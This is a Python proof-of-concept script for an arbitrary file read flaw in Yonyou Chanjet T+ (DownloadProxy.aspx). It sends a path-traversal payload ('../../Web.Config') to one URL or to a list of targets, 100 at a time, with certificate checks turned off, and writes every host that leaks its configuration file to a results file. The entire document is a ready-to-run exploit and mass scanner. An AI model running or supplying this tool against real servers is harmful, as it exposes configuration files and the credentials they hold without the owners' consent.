import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type: 用友畅捷通TPlus-DownloadProxy.aspx任意文件读取漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友畅捷通TPlus-DownloadProxy.aspx任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
    res1 = requests.get(url=target,verify=False,timeout=5)
    if res1.status_code == 200:
        res2 = requests.get(url=target+payload,verify=False,timeout=5)
        if "configuration" in res2.text:
            with open("result.txt","a",encoding='utf-8') as f:
                f.write(f"[+]{target}\n")
                f.close()
                print(f"[+]{target}存在文件读取漏洞")
        else:
            print(f"[-]{target}不存在文件读取漏洞")
    else:
        print("访问超时，请手动测试！！！")

if __name__ == '__main__':
    main()